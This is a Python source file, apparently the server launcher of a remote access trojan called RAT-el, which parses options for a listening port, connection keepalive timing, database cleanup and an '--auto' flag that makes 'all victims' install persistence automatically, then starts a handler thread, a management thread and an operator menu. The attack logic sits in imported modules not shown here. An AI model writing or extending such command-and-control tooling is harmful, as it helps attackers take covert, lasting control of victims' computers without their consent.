import sys
import argparse
import time

from scripts.handler import Handler
from scripts.menu import Menu
from scripts.management import Management
from scripts.other import printColor
from scripts.other import myBanner
from scripts.other import exec
from scripts.sql import Sql

from colorama import Fore,Style,init

exec("clear")


print(Fore.GREEN,myBanner(),Fore.BLUE)

parser = argparse.ArgumentParser()
parser.add_argument("-i","--ip", dest="IP", default="", help="the ip address of the server.")
parser.add_argument("-p","--port", dest="PORT", required=True, help="the port number of the server.")
parser.add_argument("-d","--display", action="store_false", default=True, help="disables the display of client information (Logoff and incoming connection).")
parser.add_argument("-t","--time", dest="TIME", type=float, required=True, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
parser.add_argument("-a","--auto", action="store_true", default=False,help="if the -a or --auto parameter is added then all victims will perform persistence automatically.")
parser.add_argument("-c","--clean", dest="CLEAN", action="store_true", default=False, help="cleans all the data in the database.")
try:
    argv = vars(parser.parse_args())

    HOST = str(argv["IP"])
    PORT = int(argv["PORT"])
    DISPLAY = bool(argv["display"])
    TIME = float(argv["TIME"])
    AUTO = float(argv["auto"])
    CLEAN = float(argv["CLEAN"])

except SystemExit:
    print("example: /usr/bin/python3 server.py -p 8888 -t 100" )
    exit(0)

else:
    #print("[+] Server started.\n")
    SqlObj = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
    handler= Handler(HOST,PORT,DISPLAY,AUTO, SqlObj)
    init()
    if(CLEAN):
        SqlObj.removeDatabase()
        printColor("information", "[+] Database cleaned successfully.\n")
    else:
        handler.initialization()
    
    management = Management(TIME,SqlObj) #2 seconds.

    menu = Menu()

    handler.daemon=True
    management.daemon=True
   
    handler.start()
    
    while True:
        #Test if the port listening is good.
        time.sleep(1)
        if(handler.start_handler):
            break

    management.start()
    try:
        menu.main()
        printColor("information","[-] Server down...")
    
    except KeyboardInterrupt:
        handler.SuccessfullyQuit() 
        SqlObj.closeConn()
        #SqlObj.removeDatabase()

        print("[?] By cisco")
        print("[?] juanrubio.dev@gmail.com")
        print(Style.RESET_ALL) #Restore color terminal
        sys.exit(0)
